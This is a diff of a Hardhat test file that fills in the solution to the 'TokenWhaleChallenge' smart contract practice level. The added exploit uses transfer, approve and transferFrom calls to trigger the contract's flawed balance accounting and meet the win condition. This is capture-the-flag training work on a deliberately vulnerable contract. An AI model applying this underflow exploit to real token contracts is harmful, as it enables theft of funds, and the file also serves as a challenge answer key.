@@ -1,19 +1,20 @@
 import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
+import { TokenWhaleChallenge } from '../typechain-types';
 
 describe('TokenWhaleChallenge', () => {
-  let target: Contract;
+  let target: TokenWhaleChallenge;
   let attacker: SignerWithAddress;
+  let attacker2: SignerWithAddress;
   let deployer: SignerWithAddress;
 
   before(async () => {
-    [attacker, deployer] = await ethers.getSigners();
+    [attacker, attacker2, deployer] = await ethers.getSigners();
 
-    target = await (
+    target = (await (
       await ethers.getContractFactory('TokenWhaleChallenge', deployer)
-    ).deploy(attacker.address);
+    ).deploy(attacker.address)) as unknown as TokenWhaleChallenge;
 
     await target.waitForDeployment();
 
@@ -21,9 +22,9 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    await target.transfer(attacker2.getAddress(), 1000);
+    await target.connect(attacker2).approve(attacker.getAddress(), 2000);
+    await target.transferFrom(attacker2.getAddress(), attacker2.getAddress(), 1000);
 
     expect(await target.isComplete()).to.equal(true);
   });
